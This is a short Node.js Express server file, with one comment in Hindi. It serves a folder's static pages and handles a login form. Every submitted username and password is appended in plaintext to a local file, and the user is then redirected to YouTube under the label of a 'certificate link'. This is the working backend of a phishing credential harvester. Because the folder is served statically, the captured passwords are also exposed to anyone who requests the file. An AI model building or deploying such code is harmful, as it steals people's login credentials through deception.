const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const PORT = 3000;

// Serve index.html
app.use(express.static(__dirname));

// Parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Handle login
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // Save username + password in file
  const log = `Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync("dummy.txt", log);

  // ✅ Redirect to your certificate link
  res.redirect("https://www.youtube.com");
});

// ✅ Yeh block hamesha sabse bahar hona chahiye
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);

});
